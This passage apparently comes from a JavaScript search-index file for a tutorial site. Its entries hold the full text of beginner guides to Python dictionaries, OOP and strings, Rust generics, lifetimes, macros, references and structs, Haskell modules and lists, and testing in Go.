multiplication table from 1 to 5. The outer loop selects the multiplier, and the inner loop iterates through the multiplicand, printing the product for each pair.\nConclusion linkPython’s control structures are powerful tools for creating dynamic and efficient programs. This guide has covered the essential aspects of conditional statements and loops, providing detailed explanations and practical examples to enhance understanding and applicability in real-world programming.\n"
            }
        );
    index.add(
            {
                id:  162 ,
                href: "\/tutorials\/docs\/python\/python\/python_dictionaries_and_sets\/",
                title: "Mastering Dictionaries and Sets in Python: Comprehensive Guide to Data Handling",
                description: "Enhance your Python skills by mastering dictionaries and sets. This guide covers everything from basic operations to advanced methods of dictionaries, along with a deep dive into the functionalities of sets.",
                content: "Introduction linkDictionaries and sets are powerful data structures in Python used to store and manage data. Dictionaries allow you to connect pieces of related information through key-value pairs, making data retrieval quick and straightforward. Sets, on the other hand, are useful for storing unique items and performing common mathematical operations like unions, intersections, and differences.\nWorking with Dictionaries linkDictionaries in Python are a collection of key-value pairs enclosed in curly braces {}, where each key is unique.\nCreating a Dictionary link # Creating a dictionary student = { 'name': 'John Doe', 'age': 21, 'courses': ['Math', 'Science'] } print(student) Accessing Dictionary Values linkYou can access the value associated with a particular key using the key itself or the get method.\n# Accessing dictionary values print(student['name']) # Outputs 'John Doe' print(student.get('age')) # Outputs 21 Adding or Updating Items linkAdding or updating dictionary items is straightforward—assign a value to a key directly.\n# Adding or updating dictionary items student['phone'] = '555-5555' # Adds a new key-value pair student['name'] = 'Jane Doe' # Updates the existing key print(student) Methods of Dictionaries linkDictionaries provide a variety of methods that facilitate manipulation and access to their data.\nKeys, Values, and Items link # Keys, values, and items print(student.keys()) # Outputs all the keys print(student.values()) # Outputs all the values print(student.items()) # Outputs all key-value pairs Using update to Merge Dictionaries link # Updating with another dictionary other_data = {'gender': 'Female', 'age': 22} student.update(other_data) print(student) Removing Items with pop and popitem link # Removing items phone = student.pop('phone') # Removes 'phone' print(phone) last_item = student.popitem() # Removes the last inserted item print(last_item) Sets and Their Operations linkSets are collections of unordered, unique elements defined by curly braces {} or the set() constructor.\nCreating Sets link # Creating a set fruits = {'apple', 'banana', 'cherry'} print(fruits) Set Operations: Union, Intersection, Difference link # Basic set operations vegetables = {'spinach', 'kale', 'banana'} print(fruits.union(vegetables)) # All elements from both print(fruits.intersection(vegetables)) # Common elements print(fruits.difference(vegetables)) # Elements unique to fruits Conclusion linkDictionaries and sets are indispensable tools in Python programming, providing efficient ways to handle data. Understanding how to effectively utilize these data structures can significantly improve the performance and scalability of your applications. This guide has provided an in-depth look at both dictionaries and sets, from their basic functionalities to more complex operations, preparing you for more advanced Python tasks.\n"
            }
        );
    index.add(
            {
                id:  163 ,
                href: "\/tutorials\/docs\/rust\/rust\/mastering_generics_traits_rust\/",
                title: "Mastering Generic Types and Traits in Rust",
                description: "Unlock the full potential of Rust’s type system with an in-depth exploration of generic types and traits. This comprehensive guide delves into the creation and use of generics to write flexible and reusable code, and explains how traits and trait bounds are used to define shared behavior across types. Packed with technical insights and practical examples, this post is perfect for Rust programmers aiming to elevate their coding practices.",
                content: "Introduction linkGenerics and traits are two of Rust’s most powerful features, allowing for more flexible and reusable code while maintaining Rust’s strict type safety. Generics let you write functions and data types that can operate on many different data types, while traits specify shared behavior that different types can implement. This post provides a detailed look at both, along with practical examples and best practices.\nIntroduction to Generics linkGenerics are the tool Rust provides to handle the concept of abstract types. They allow you to define functions, structs, enums, or methods that can perform the same operations on a variety of different types specified later during usage.\nBasic Example of Generics in Functions:\nfn largest(list: \u0026[T]) -\u003e T { let mut largest = list[0]; for \u0026item in list.iter() { if item \u003e largest { largest = item; } } largest } This function largest takes a slice of any type that implements the PartialOrd and Copy traits, and returns the largest item. It can work with any comparable type, such as integers or floating-point numbers.\nUsing Generics in Structs:\nstruct Point { x: T, y: T, } Here, Point is defined with a generic type T, which means you can have a point defined with any data type, such as Point or Point.\nTraits and Trait Bounds linkTraits in Rust define functionality a particular type has and can share with other types. Trait bounds specify the functionality a generic type must provide.\nDefining a Trait:\ntrait Summary { fn summarize(\u0026self) -\u003e String; } This Summary trait defines a method summarize that any type implementing this trait will need to provide. It’s a way to define shared behavior.\nImplementing Traits:\nstruct Article { title: String, author: String, content: String, } impl Summary for Article { fn summarize(\u0026self) -\u003e String { format!(\"{}, by {} ({}...)\", self.title, self.author, \u0026self.content[..60]) } } Here, Article implements the Summary trait, providing a custom way to summarize an article.\nUsing Trait Bounds in Generics:\nfn notify(item: impl Summary) { println!(\"Breaking news! {}\", item.summarize()); } This function notify takes any item that implements the Summary trait. You can also specify the trait bound using the + syntax for multiple traits, or where clauses for clearer syntax in complex situations.\nAdvanced Topics in Generics and Traits link Associated Types: Traits can define associated types, specifying placeholder types that are used in trait methods. Default Implementations: Traits can provide default method implementations, allowing types to use the default behavior or override it. Trait Bounds to Conditionally Implement Methods: Using trait bounds, you can implement methods conditionally for types that implement specific traits. Example of Trait with an Associated Type:\ntrait Iterator { type Item; fn next(\u0026mut self) -\u003e Option; } This Iterator trait defines an associated type Item, which will be the type yielded by the iterator.\nConclusion linkGenerics and traits are crucial for writing highly reusable and maintainable Rust code. They enable programmers to write flexible functions and types while maintaining type safety and minimizing code duplication. As you continue to explore Rust, understanding and utilizing generics and traits will allow you to take full advantage of Rust’s powerful type system to write more efficient and effective code.\n"
            }
        );
    index.add(
            {
                id:  164 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/module-system-in-haskell\/",
                title: "Mastering Haskell’s Module System for Efficient Code Organization",
                description: "Learn how to effectively organize your Haskell projects with a comprehensive guide to Haskell’s module system, including how to import, export, and structure your code across multiple modules.",
                content: "Introduction: linkWelcome to our exploration of the Haskell Module System—a powerful feature for managing and organizing code in large Haskell projects. Haskell’s module system not only enhances code readability and maintainability but also facilitates code reuse and collaboration. In this post, we will dive into how to organize code with modules, handle importing and exporting, and effectively split a project into multiple modules. By mastering these aspects, you can scale your Haskell projects efficiently while keeping the codebase clean and organized.\nOrganizing Code with Modules linkIntroduction to Modules:\nModules in Haskell are the primary way to organize functions, types, and data structures into separate namespaces. Each module in Haskell can encapsulate a set of related functionalities, making them easier to manage and understand.\nCreating a Module: To create a module, you start with a module declaration, followed by the definitions of functions, types, or values you want to include. -- Define a module named Geometry module Geometry where area :: Float -\u003e Float -\u003e Float area width height = width * height Importing and Exporting Modules linkManaging Imports:\nModules can import other modules using the import keyword. This allows one module to access functions, types, and values defined in another module.\nBasic Import: Importing a module without any modifiers imports all of its exported contents.\nimport Data.List Selective Import: You can specify exactly what to import from a module, which helps avoid name clashes and improve readability.\nimport Data.List (nub, sort) Qualified Import: To avoid name clashes without restricting imports, you can use qualified imports.\nimport qualified Data.Map as Map Exporting from Modules:\nTo control what a module exposes to other modules, you use export lists. If no export list is provided, all names are exported by default.\nSpecifying Exports: module Geometry (area, volume) where area :: Float -\u003e Float -\u003e Float area width height = width * height volume :: Float -\u003e Float -\u003e Float -\u003e Float volume width height depth = width * height * depth Splitting a Project into Multiple Modules linkProject Structure:\nWhen a Haskell project grows, it’s beneficial to split the codebase into multiple modules. This not only helps in organizing the code better but also in managing large codebases more effectively.\nExample Project Structure: Suppose you are building a project that handles geometric calculations and data processing. You could organize it as follows:\nsrc/ ├── Main.hs # Main module ├── Geometry.hs # Handles geometric calculations └── DataProcessing.hs # Processes and manipulates data Module Interaction: Each module should have a clear responsibility. Main.hs might coordinate actions between Geometry and DataProcessing, using their functions to perform higher-level tasks.\nConclusion:\nHaskell’s module system is a crucial tool for developers looking to manage complexity in large software projects. By effectively using modules to organize, import, and export code, you can enhance the scalability, maintainability, and clarity of your Haskell applications. As your projects grow, continue refining your approach to module organization to keep your codebase healthy and manageable.\nFrequently Asked Questions:\nQ: How do I handle cyclic dependencies between modules? A: Cyclic dependencies can be problematic in Haskell. Try to refactor your code to eliminate cyclic dependencies, possibly by creating a new module to hold the common functionalities.\nQ: Can modules be dynamically loaded in Haskell? A: Haskell does not support dynamic loading of modules in the same way some other languages do. All modules are compiled statically.\n"
            }
        );
    index.add(
            {
                id:  165 ,
                href: "\/tutorials\/docs\/rust\/rust\/mastering_lifetime_management_rust\/",
                title: "Mastering Lifetime Management in Rust",
                description: "Explore the crucial concept of lifetimes in Rust, understanding how to define and use lifetime annotations to manage memory safely and efficiently. This comprehensive guide discusses the intricacies of lifetimes in Rust, providing technical insights, practical coding examples, and best practices for effective lifetime management in your Rust applications.",
                content: "Introduction linkLifetimes are a foundational feature of Rust that ensures memory safety without the overhead of garbage collection. They are annotations that allow the Rust compiler to check that all borrows are valid for the duration of those borrows. This post explains the concept of lifetimes, how to annotate them in functions, and why understanding lifetimes is essential for writing robust Rust code.\nUnderstanding Lifetimes linkIn Rust, every reference has a lifetime, which is the scope for which that reference is valid. Most of the time, lifetimes are implicit and inferred, just as most types are inferred. However, when multiple lifetimes could be possible, Rust needs explicit annotations to determine which lifetime each reference should have.\nWhy Lifetimes Matter: Lifetimes ensure that references do not outlive the data they refer to. Without lifetime annotations, Rust’s compiler can’t confirm that the memory referenced by a pointer remains valid, leading to potential bugs like use-after-free, dangling pointers, or other forms of undefined behavior.\nLifetime Annotations in Functions linkLifetime annotations describe relationships between the lifetimes of arguments and return values in functions. When defining functions that use references, you might need to explicitly annotate lifetimes to help the compiler understand the relationships between the data referenced by the parameters.\nBasic Syntax for Annotating Lifetimes:\nfn longest\u003c'a\u003e(x: \u0026'a str, y: \u0026'a str) -\u003e \u0026'a str { if x.len() \u003e y.len() { x } else { y } } In this example, 'a is a lifetime parameter specifying that the return type has the same lifetime as both input references.\nPractical Examples of Lifetime Usage linkLifetime in Struct Definitions:\nstruct ImportantExcerpt\u003c'a\u003e { part: \u0026'a str, } fn main() { let novel = String::from(\"Call me Ishmael. Some years ago...\"); let first_sentence = novel.split('.').next().expect(\"Could not find a '.'\"); let excerpt = ImportantExcerpt { part: first_sentence, }; } This struct ImportantExcerpt has a lifetime annotation 'a to ensure that the reference part does not outlive the string it points to.\nPreventing Dangling References:\nfn dangle() -\u003e \u0026String { // This function's return type contains a borrowed value, but there is no value for it to be borrowed from. let s = String::from(\"hello\"); \u0026s } // s goes out of scope and is dropped here, so the reference to it would be invalid. This code snippet illustrates what lifetimes prevent. The compiler will reject this code because it does not satisfy Rust’s safety guarantees.\nAdvanced Lifetime Scenarios linkRust’s lifetime rules are designed to be as minimal as possible, but for complex scenarios involving multiple references, knowing how to manually annotate lifetimes becomes essential.\nMultiple Lifetime Parameters:\nfn multiple_lifetimes\u003c'a, 'b\u003e(x: \u0026'a str, y: \u0026'b str) -\u003e \u0026'a str { println!(\"Second string is: {}\", y); x } This function explicitly states that it can accept two parameters with different lifetimes and indicates the lifetime of the return value.\nLifetime Elision Rules: Rust applies three rules to determine lifetimes when the developer does not explicitly annotate them:\nEach parameter gets its own lifetime. If there is exactly one input lifetime, that lifetime is assigned to all output lifetimes. If a method has multiple input lifetimes and one of them is \u0026self, the lifetime of \u0026self is assigned to all output lifetimes. These elision rules cover the majority of cases encountered in practice and allow for less verbose code.\nConclusion linkLifetimes are a powerful part of Rust’s type system, providing guarantees that help prevent common bugs associated with memory management in system programming. Mastery of lifetimes is crucial for any Rust programmer, as it ensures that the software you write is not only efficient but also safe.\n"
            }
        );
    index.add(
            {
                id:  166 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/working-with-lists-in-haskell\/",
                title: "Mastering List Operations in Haskell",
                description: "Explore the essentials of working with lists in Haskell, including detailed list operations and the use of list comprehensions. Discover practical examples to enhance your Haskell programming skills.",
                content: "Introduction:\nWelcome back to our exploration of Haskell, the pure functional programming language known for its powerful handling of data structures, particularly lists. Lists in Haskell are not just fundamental; they are central to many programming patterns and techniques in the language. This guide delves deep into Haskell lists, covering everything from basic operations to more advanced manipulations with list comprehensions and practical examples to enhance your understanding and skills.\nUnderstanding Lists in Haskell\nCore Concepts:\nLists in Haskell are homogeneous data structures, meaning they store elements of the same type. They are defined recursively and are central to the language’s approach to handling collections of data.\nSyntax and Construction:\nprimes :: [Integer] primes = [2, 3, 5, 7, 11, 13] -- A simple list of integers Cons Operator (:): This operator is used to construct lists by prepending an element to an existing list (or the empty list).\nmorePrimes = 17 : primes -- Results in [17, 2, 3, 5, 7, 11, 13] List Operations and Comprehensions\nExploring Basic Operations:\nHaskell provides a suite of functions designed for efficient list manipulation, facilitating operations such as mapping, filtering, and folding that are essential in functional programming.\nMapping (map):\nsquare :: [Integer] -\u003e [Integer] square = map (^2) Filtering (filter):\noddNumbers :: [Integer] -\u003e [Integer] oddNumbers = filter odd Folding (foldl, foldr):\nsumOfList :: [Integer] -\u003e Integer sumOfList = foldr (+) 0 Advanced List Comprehensions:\nList comprehensions in Haskell allow you to create new lists by describing their contents, making the code more readable and expressive.\nGenerating Lists:\nsquares = [x^2 | x \u003c- [1..10]] -- List of squares from 1 to 10 Conditional List Comprehension:\nevenSquares = [x^2 | x \u003c- [1..10], even x] -- Squares of even numbers only Practical Examples of List Manipulation\nGenerating Fibonacci Sequence:\nUsing lazy evaluation, Haskell can efficiently handle potentially infinite lists, such as sequences defined recursively.\nfibonacci :: [Integer] fibonacci = 0 : 1 : zipWith (+) fibonacci (tail fibonacci) Prime Number Generation (Sieve of Eratosthenes):\nHaskell’s list comprehensions can be effectively used to implement complex algorithms like the Sieve of Eratosthenes in a concise way.\nprimes :: [Integer] primes = sieve [2..] where sieve (p:xs) = p : sieve [x | x \u003c- xs, x `mod` p /= 0] Sorting Algorithms Using Lists:\nList comprehensions and recursive functions lend themselves well to concise implementations of sorting algorithms.\nquickSort :: [Integer] -\u003e [Integer] quickSort [] = [] quickSort (x:xs) = quickSort [y | y \u003c- xs, y \u003c= x] ++ [x] ++ quickSort [y | y \u003c- xs, y \u003e x] Conclusion:\nLists are an indispensable part of Haskell, offering a versatile and powerful tool for a wide range of programming tasks—from simple data manipulations to complex algorithmic implementations. By mastering the various operations and techniques for list handling in Haskell, you can significantly enhance the efficiency and readability of your functional programming projects. Dive deep into these concepts, experiment with different list operations, and explore how you can leverage Haskell’s powerful features to handle data effectively.\nFrequently Asked Questions:\nQ: What are the performance implications of using lists in Haskell? A: While lists are incredibly versatile, they are not always the most performant data structure for every scenario, especially for random access and frequent insertions or deletions. For such cases, other data structures like arrays or sequences might be more appropriate.\nQ: Can list comprehensions handle complex filtering and transformations? A: Absolutely, list comprehensions in Haskell are quite powerful and can be nested, include multiple conditions, and perform comprehensive transformations, allowing for very sophisticated data processing tasks to be described declaratively.\n"
            }
        );
    index.add(
            {
                id:  167 ,
                href: "\/tutorials\/docs\/rust\/rust\/macros-rust\/",
                title: "Mastering Macros in Rust",
                description: "Dive deep into the powerful macro system of Rust with this comprehensive guide on understanding and creating custom macros. This post provides a detailed exploration of macro syntax, practical examples of custom macros, and best practices for utilizing macros to write more concise and flexible Rust code.",
                content: "Introduction linkMacros in Rust are a powerful metaprogramming tool that allows you to write code that writes other code, which is a powerful way to reduce boilerplate and enhance the functionality of your Rust programs. Unlike functions, macros operate on the syntactic level and can take a variable number of arguments. This post explores the foundations of macros in Rust and guides you through writing custom macros.\nIntroduction to Macros linkMacros come in several flavors in Rust, including declarative macros (macro_rules!) and procedural macros, which include custom #[derive] macros, attribute-like macros, and function-like macros.\nUnderstanding macro_rules!:\nThe most commonly used macros in Rust are defined with macro_rules!. These macros are pattern-matching macros that execute code based on the structure of the input tokens. macro_rules! say_hello { () =\u003e ( println!(\"Hello\"); ); } fn main() { say_hello!(); } This simple macro prints “Hello” when called. It doesn’t take any arguments and uses no variables. Writing Custom Macros linkCustom macros can dramatically reduce the amount of code you need to write and maintain, especially when you find yourself repeating the same patterns.\nMacro Syntax and Design:\nWriting macros often involves specifying patterns and the corresponding code that should be generated. Patterns are matched against the input provided to the macro. macro_rules! create_function { ($func_name:ident) =\u003e ( fn $func_name() { println!(\"Function {:?} is called\", stringify!($func_name)); } ); } create_function!(foo); create_function!(bar); fn main() { foo(); bar(); } Here, create_function! generates functions based on the name provided. $func_name:ident captures a function name, and stringify! converts it to a string during compile time. Procedural Macros:\nProcedural macros allow for more complex and flexible manipulations of Rust code. They are functions that receive tokens of Rust code as input and produce tokens to replace the macro invocation. Creating a Custom derive Macro: extern crate proc_macro; use proc_macro::TokenStream; use quote::quote; use syn; #[proc_macro_derive(HelloMacro)] pub fn hello_macro_derive(input: TokenStream) -\u003e TokenStream { let ast = syn::parse(input).unwrap(); let name = \u0026ast.ident; let gen = quote! { impl HelloMacro for #name { fn hello_macro() { println!(\"Hello, Macro! My name is {}\", stringify!(#name)); } } }; gen.into() } This derive macro adds a hello_macro method to structs that derive it, showcasing the use of the quote and syn crates for macro expansion. Best Practices for Macro Usage link Use Macros Sparingly: While powerful, macros can make code harder to read and debug. Use them when they provide significant benefits over functions or other Rust features. Document Macros Well: Because macros can be tricky to understand and use, thorough documentation is particularly important. Consider Maintenance: Macros can be difficult to maintain, especially complex ones. Design them to be as simple and clear as possible. Conclusion linkMacros in Rust offer a potent tool for code generation, allowing for more abstract and less repetitive code bases. They are especially useful for tasks that require patterns or code that cannot be easily expressed in functions. With careful use, macros can significantly enhance the power and expressiveness of your Rust applications.\n"
            }
        );
    index.add(
            {
                id:  168 ,
                href: "\/tutorials\/docs\/python\/python\/python_object_oriented_programming\/",
                title: "Mastering Object-Oriented Programming in Python: Classes, Inheritance, and Polymorphism",
                description: "Unlock the full potential of object-oriented programming in Python with this extensive guide. Learn how to define classes, create objects, and utilize inheritance and polymorphism to design reusable and modular code.",
                content: "Introduction linkObject-oriented programming is a programming paradigm that uses “objects” — data structures consisting of data fields and methods together with their interactions — to design applications and computer programs. Python allows developers to implement OOP to enhance the modularity and reusability of their code.\nClasses and Objects linkIn Python, classes provide a means of bundling data and functionality together. Creating a new class creates a new type of object, allowing new instances of that type to be made.\nDefining a Class and Creating Objects link class Dog: # Class Attribute species = \"Canis familiaris\" def __init__(self, name, age): self.name = name # Instance attribute self.age = age # Instance attribute # Creating instances of the Dog class buddy = Dog(\"Buddy\", 9) miles = Dog(\"Miles\", 4) print(f\"{buddy.name} is {buddy.age} years old.\") Here, Dog is a class with two instance attributes (name and age) and a class attribute (species). buddy and miles are instances of this class.\nAttributes and Methods linkAttributes are data stored inside a class or instance, and methods are functions that are defined inside a class.\nInstance Methods link class Dog: def __init__(self, name, age): self.name = name self.age = age def description(self): return f\"{self.name} is {self.age} years old\" def speak(self, sound): return f\"{self.name} says {sound}\" # Using instance methods miles = Dog(\"Miles\", 4) print(miles.description()) # Miles is 4 years old print(miles.speak(\"Woof Woof\")) # Miles says Woof Woof description and speak are instance methods which act on data attributes of the class.\nInheritance and Polymorphism linkInheritance allows one class to inherit the attributes and methods of another, while polymorphism allows for the use of a unified interface for different data types.\nInheritance link # Base class class Dog: def __init__(self, name, age): self.name = name self.age = age def speak(self, sound): return f\"{self.name} says {sound}\" # Derived class class JackRussellTerrier(Dog): def speak(self, sound=\"Arf\"): return super().speak(sound) # Using the derived class jack = JackRussellTerrier(\"Jack\", 3) print(jack.speak()) # Jack says Arf JackRussellTerrier inherits from Dog but overrides the speak method (demonstrating polymorphism).\nPolymorphism linkPolymorphism allows methods to be implemented in different ways between classes.\nclass Bulldog(Dog): def speak(self, sound=\"Woof\"): return super().speak(sound) # Different classes, same interface jim = Bulldog(\"Jim\", 5) print(jim.speak()) # Jim says Woof Conclusion linkObject-oriented programming in Python provides a powerful model for organizing and reusing code through classes and objects. Understanding classes, inheritance, and polymorphism is crucial for any Python programmer looking to build scalable and efficient applications. This guide has aimed to provide a comprehensive understanding of Python’s OOP features.\n"
            }
        );
    index.add(
            {
                id:  169 ,
                href: "\/tutorials\/docs\/rust\/rust\/mastering_references_borrowing_rust\/",
                title: "Mastering References and Borrowing in Rust",
                description: "Dive deep into the concepts of references and borrowing in Rust, exploring both immutable and mutable references, and how they interact with Rust's ownership rules to facilitate safe and efficient memory management.",
                content: "Introduction linkReferences and borrowing are pivotal concepts in Rust that complement the ownership system, enabling flexible and safe memory management. This post offers a comprehensive examination of references, the rules of borrowing, and practical implications to empower you with the ability to write safe and efficient Rust programs.\nUnderstanding References and Borrowing linkReferences in Rust allow you to access values without taking ownership, enabling multiple parts of your code to access data without costly copying or violating ownership rules.\nCreating and Using References:\nlet s1 = String::from(\"Hello, Rust!\"); let ref_to_s1 = \u0026s1; // Create an immutable reference println!(\"Using reference: {}\", ref_to_s1); Here, ref_to_s1 does not own the string; it merely has a reference to it, which allows for safe, read-only access.\nImmutable References linkImmutable references (\u0026T) are the default in Rust and allow multiple parts of your program to read data without risk of modification, enforcing thread safety and data consistency.\nDetailed Exploration of Immutable References:\nlet s1 = String::from(\"Hello\"); let ref1 = \u0026s1; let ref2 = \u0026s1; println!(\"ref1: {}, ref2: {}\", ref1, ref2); // Multiple immutable references are allowed The above example highlights how Rust permits any number of immutable references because they ensure that the data will not be changed unexpectedly.\nMutable References linkMutable references (\u0026mut T) allow you to modify the data they reference. Rust’s strict regulation of mutable references ensures that mutable references do not lead to data races or other unsafe memory behavior.\nExploring Rules and Use Cases of Mutable References:\nlet mut s1 = String::from(\"Hello\"); { let s2 = \u0026mut s1; s2.push_str(\", world!\"); } // s2 goes out of scope here, allowing for other references afterwards println!(\"{}\", s1); This example demonstrates Rust’s scoping rules for mutable references, where s2 must go out of scope before another reference can be made.\nPractical Implications and Best Practices linkCombining the knowledge of immutable and mutable references enables sophisticated management of data access in complex applications:\nAvoiding Data Races: By enforcing that either multiple immutable references or one mutable reference can access a particular piece of data at one time, Rust prevents data races.\nAdvanced Pattern - Shadowing: Shadowing in Rust allows reusing variable names. It can be combined with references for clearer and safer code:\nlet x = 5; let x = \u0026x; println!(\"The value of x is: {}\", x); Shadowing here allows reusing x as a reference to the original x, simplifying code without sacrificing safety.\nLifetime Annotations: Lifetime annotations help manage how long references are valid, ensuring that references do not outlast the data they refer to, which prevents dangling references.\nfn longest\u003c'a\u003e(x: \u0026'a str, y: \u0026'a str) -\u003e \u0026'a str { if x.len() \u003e y.len() { x } else { y } } This function signature with lifetime annotations 'a ensures that the return value lives as long as the shortest of the inputs.\nConclusion linkBy mastering references and borrowing, you unlock powerful tools in Rust that support writing robust, efficient, and safe code. Understanding these concepts deeply is crucial for any Rust programmer looking to leverage the full potential of Rust’s memory safety guarantees.\nAs you continue your journey with Rust, remember that these tools are designed to help you manage resources effectively, without the overhead typically associated with safe memory management.\n"
            }
        );
    index.add(
            {
                id:  170 ,
                href: "\/tutorials\/docs\/python\/python\/python_string_manipulation\/",
                title: "Mastering String Manipulation in Python: Operations, Methods, and Formatting",
                description: "Explore the art of string manipulation in Python through this comprehensive guide. Learn basic operations, discover powerful string methods, and master the formatting techniques to enhance your data processing skills.",
                content: "Introduction linkStrings in Python are sequences of characters that are used to store text data. Python provides a rich set of methods and operations to work with strings, making it a robust tool for text manipulation needed in various applications from web development to data science.\nBasic String Operations linkStrings in Python can be created by enclosing characters in quotes. You can use either single, double, or triple quotes for strings, with triple quotes used mostly for multiline strings.\nCreating and Accessing Strings link # Creating strings simple_string = \"Hello, Python!\" multiline_string = \"\"\"This is a multiline string that spans several lines.\"\"\" # Accessing string characters print(simple_string[0]) # 'H' print(simple_string[-1]) # '!' In this example, simple_string is a simple one-line string, and multiline_string spans multiple lines. Strings are indexed with the first character at index 0.\nConcatenation and Repetition link # Concatenating strings greeting = \"Hello\" name = \"Alice\" message = greeting + \" \" + name + \"!\" print(message) # \"Hello Alice!\" # Repeating strings laugh = \"Ha\" print(laugh * 3) # \"HaHaHa\" Concatenation combines strings together, and repetition repeats the string a specified number of times.\nString Methods linkPython strings come equipped with numerous methods that allow for powerful and flexible manipulations.\nCommon String Methods link # Changing case phrase = \"Python programming\" print(phrase.upper()) # \"PYTHON PROGRAMMING\" print(phrase.lower()) # \"python programming\" # Finding and replacing print(phrase.find('pro')) # 7 print(phrase.replace('programming', 'coding')) # \"Python coding\" The .upper() and .lower() methods change the case of the string. The .find() method returns the starting index of the substring if found. The .replace() method replaces occurrences of a substring with another.\nTrimming and Splitting link info = \" python \" print(info.strip()) # \"python\" removes spaces from both ends data = \"Python,Java,C++\" languages = data.split(',') print(languages) # ['Python', 'Java', 'C++'] The .strip() method removes whitespace from both ends of a string. The .split() method divides a string into a list based on the separator.\nFormatting Strings linkFormatting strings in Python allows for dynamic construction of strings.\nUsing f-strings (Formatted String Literals) link user = \"Anna\" age = 28 print(f\"{user} is {age} years old.\") # \"Anna is 28 years old.\" F-strings, introduced in Python 3.6, allow for embedding expressions inside string constants using {}.\nFormatting with .format() link print(\"Welcome, {0}. You are {1} years old.\".format(user, age)) The .format() method is versatile and supports positional and keyword arguments for inserting data into strings.\nConclusion linkString manipulation is a critical skill in Python programming, useful across various applications. This guide has explored the foundational operations, various methods for string manipulation, and different ways to format strings, providing a deep understanding of how to work effectively with text in Python.\n"
            }
        );
    index.add(
            {
                id:  171 ,
                href: "\/tutorials\/docs\/rust\/rust\/mastering_structs_rust\/",
                title: "Mastering Structs in Rust: Definition, Methods, and Usage",
                description: "Dive deep into the fundamentals and advanced uses of structs in Rust, covering their definition, the implementation of methods, and associated functions. This comprehensive guide includes practical examples and technical explanations to master struct-based designs in Rust programming.",
                content: "Introduction linkStructs are fundamental to organizing structured data in Rust, serving as custom data types that encapsulate related properties and behaviors. This post explores how to define and use structs, incorporate methods to add behavior, and utilize associated functions for utility operations, all of which are pivotal for designing robust and maintainable Rust applications.\nDefining and Using Structs linkStructs in Rust allow you to create custom data types that group related variables within one logical unit. This not only helps in managing data more efficiently but also improves the clarity and scalability of the code.\nBasic Definition of a Struct:\nstruct User { username: String, email: String, sign_in_count: u64, active: bool, } This User struct represents a typical user profile, encapsulating attributes related to a user in one cohesive unit.\nInstantiating Structs:\nlet user1 = User { email: String::from(\"user@example.com\"), username: String::from(\"someusername123\"), active: true, sign_in_count: 1, }; Creating an instance of a struct involves specifying concrete values for each field, following the order declared in the struct.\nUpdating Structs: Rust provides a functionality to update a struct instance using another instance with the .. syntax, which is particularly useful when you need to create a new struct that changes some but not all attributes from another instance.\nlet user2 = User { email: String::from(\"another@example.com\"), username: String::from(\"anotherusername456\"), ..user1 }; This snippet creates a new User instance by changing the email and username from user1 but keeping the other fields.\nStruct Methods and Associated Functions linkMethods in Rust are functions defined within the context of a struct (or an enum or a trait object), and their first parameter is always self, which represents the instance of the struct the method is called on.\nDefining Methods:\nimpl User { fn email(\u0026self) -\u003e \u0026String { \u0026self.email } } This method email allows you to access the email of a User instance in an encapsulated manner, ensuring that the method operations can only interact with the data through well-defined interfaces.\nAssociated Functions: Unlike methods, associated functions do not take self as a parameter and are called on the struct itself, not on an instance of the struct. They are used for constructors or other utility functions that do not necessarily require an instance of the struct.\nimpl User { fn new_user(email: String, username: String) -\u003e User { User { email, username, active: true, sign_in_count: 1, } } } new_user acts as a constructor, providing a clean interface to create a User.\nAdvanced Usage of Structs linkStructs can also define more complex relationships like nested structs or use different types like tuples to simplify code and enhance readability.\nExample of Nested Structs:\nstruct Rectangle { width: u32, height: u32, } struct Profile { username: String, display_area: Rectangle, } Here, Profile includes a Rectangle struct within it, demonstrating how structs can be nested to represent more complex data relationships effectively.\nTuple Structs: Tuple structs are essentially named tuples. They are useful when you want to give the whole tuple a name and make the tuple elements be part of the type.\nstruct Color(i32, i32, i32); let black = Color(0, 0, 0); This Color tuple struct represents a color using RGB values.\nConclusion linkStructs are a powerful feature in Rust that enable the creation of custom data types tailored to the specific requirements of your software, promoting cleaner, more organized, and safer code. Understanding how to effectively use structs, along with their methods and associated functions, is essential for any Rust developer aiming to build scalable and efficient applications.\n"
            }
        );
    index.add(
            {
                id:  172 ,
                href: "\/tutorials\/docs\/golang\/golang\/testing-in-go\/",
                title: "Mastering Testing in Go",
                description: "Dive into the best practices of writing unit tests in Go, leveraging the built-in testing package, and utilizing benchmarks and profiling to optimize your Go applications.",
                content: "Introduction:\nHello, Go developers! Effective testing is the backbone of any robust software development process, ensuring your applications perform as expected under various conditions and are free from critical bugs. Go provides a powerful built-in testing package that not only supports unit tests but also offers tools for benchmarks and profiling. This blog will walk you through the comprehensive testing capabilities in Go, from writing unit tests to conducting performance analysis through benchmarks and profiling.\n1. Writing Unit Tests in Go\nUnit testing involves testing individual components of the software separately to ensure that each part functions correctly. Go’s approach to unit testing is straightforward and integrated directly into the language.\na. Using the Testing Package:\nTo write unit tests in Go, you create a test file for each Go file you want to test. The test file should be named with a _test.go suffix. For example, if your file is named calculator.go, your test file should be calculator_test.go.\nb. Writing a Basic Test Function:\nTest functions in Go are written like any other function, but they need to take one parameter, typically named t, of type *testing.T. This is used to manage test state and support formatted test logs.\npackage calculator import \"testing\" func TestAdd(t *testing.T) { result := Add(1, 2) if result != 3 { t.Errorf(\"Add(1, 2) = %d; want 3\", result) } } c. Running Tests:\nTo run the tests, use the go test command in your terminal. This command will automatically recognize any file that ends with _test.go and execute the appropriate tests.\n2. Organizing Tests and Using Table-Driven Tests\nOrganizing tests logically and using table-driven tests can make your testing suite more maintainable and comprehensive.\na. Table-Driven Testing:\nThis approach allows you to define multiple test cases in a single structure and run a loop over them. This is especially useful for testing functions against various inputs and outputs.\nfunc TestMultiply(t *testing.T) { var tests = []struct { a, b int want int }{ {1, 2, 2}, {2, 3, 6}, {3, 4, 12}, {-1, -1, 1}, } for _, tt := range tests { testname := fmt.Sprintf(\"%d,%d\", tt.a, tt.b) t.Run(testname, func(t *testing.T) { ans := Multiply(tt.a, tt.b) if ans != tt.want { t.Errorf(\"got %d, want %d\", ans, tt.want) } }) } } 3. Benchmarks and Profiling\nWhile unit tests check for correctness, benchmarks and profiling assess the performance of your code.\na. Writing Benchmarks:\nBenchmarks in Go are similar to tests but are used to measure the performance of your code. They are written in _test.go files by creating functions that begin with Benchmark.\nfunc BenchmarkAdd(b *testing.B) { for i := 0; i \u003c b.N; i++ { 